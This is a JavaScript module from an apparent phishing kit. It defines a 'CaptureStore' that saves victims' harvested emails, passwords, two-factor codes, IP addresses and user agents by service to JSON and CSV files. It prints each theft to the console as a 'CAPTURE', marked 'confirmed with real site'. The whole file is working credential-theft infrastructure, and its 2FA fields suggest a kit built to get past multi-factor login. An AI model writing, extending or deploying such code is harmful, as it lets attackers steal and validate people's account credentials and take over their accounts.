import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import chalk from 'chalk';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const CAPTURES_DIR = path.join(__dirname, '..', 'captures');

if (!fs.existsSync(CAPTURES_DIR)) {
  fs.mkdirSync(CAPTURES_DIR, { recursive: true });
}

class CaptureStore {
  constructor() {
    this.credentials = [];
    this.load();
  }

  load() {
    const jsonPath = path.join(CAPTURES_DIR, 'credentials.json');
    if (fs.existsSync(jsonPath)) {
      try {
        this.credentials = JSON.parse(fs.readFileSync(jsonPath, 'utf-8'));
      } catch {}
    }
    // Ensure CSV header exists
    const csvPath = path.join(CAPTURES_DIR, 'credentials.csv');
    if (!fs.existsSync(csvPath)) {
      fs.writeFileSync(csvPath, 'timestamp,service,email,password,2fa_code,validated,ip\n');
    }
  }

  save() {
    const jsonPath = path.join(CAPTURES_DIR, 'credentials.json');
    fs.writeFileSync(jsonPath, JSON.stringify(this.credentials, null, 2));
  }

  appendToCsv(entry) {
    const csvPath = path.join(CAPTURES_DIR, 'credentials.csv');
    const ip = (entry.ip || '').replace(/,/g, ' ');
    const ua = (entry.user_agent || '').replace(/,/g, ' ');
    fs.appendFileSync(csvPath,
      `${entry.timestamp},${entry.service},${entry.email},${entry.password},${entry.twofa_code || ''},${entry.validated},${ip}\n`
    );
  }

  add(entry) {
    const cred = {
      id: crypto.randomUUID().slice(0, 8),
      timestamp: new Date().toISOString(),
      service: entry.service,
      email: entry.email,
      password: entry.password,
      twofa_code: entry.twofa_code || null,
      validated: entry.validated || false,
      ip: entry.ip || '',
      user_agent: entry.user_agent || '',
    };

    this.credentials.push(cred);
    this.save();
    this.appendToCsv(cred);
    this.printCapture(cred);

    return cred;
  }

  printCapture(cred) {
    console.log('\n' + chalk.gray('─'.repeat(50)));
    console.log(chalk.red('  🎣 CAPTURE'));
    console.log(chalk.gray('─'.repeat(50)));
    console.log(`  ${chalk.white('Service:')}  ${chalk.cyan(cred.service)}`);
    console.log(`  ${chalk.white('Email:')}    ${chalk.yellow(cred.email)}`);
    console.log(`  ${chalk.white('Password:')} ${chalk.yellow(cred.password)}`);
    if (cred.twofa_code) {
      console.log(`  ${chalk.white('2FA Code:')} ${chalk.magenta(cred.twofa_code)}`);
    }
    if (cred.validated) {
      console.log(`  ${chalk.white('Valid:')}    ${chalk.green('✓ confirmed with real site')}`);
    }
    console.log(`  ${chalk.white('IP:')}       ${chalk.gray(cred.ip)}`);
    console.log(`  ${chalk.white('Time:')}     ${chalk.gray(new Date(cred.timestamp).toLocaleString())}`);
    console.log(chalk.gray('─'.repeat(50)) + '\n');
  }

  getAll() {
    return this.credentials;
  }

  count() {
    return this.credentials.length;
  }

  byService() {
    const counts = {};
    for (const c of this.credentials) {
      counts[c.service] = (counts[c.service] || 0) + 1;
    }
    return counts;
  }
}

export const captureStore = new CaptureStore();
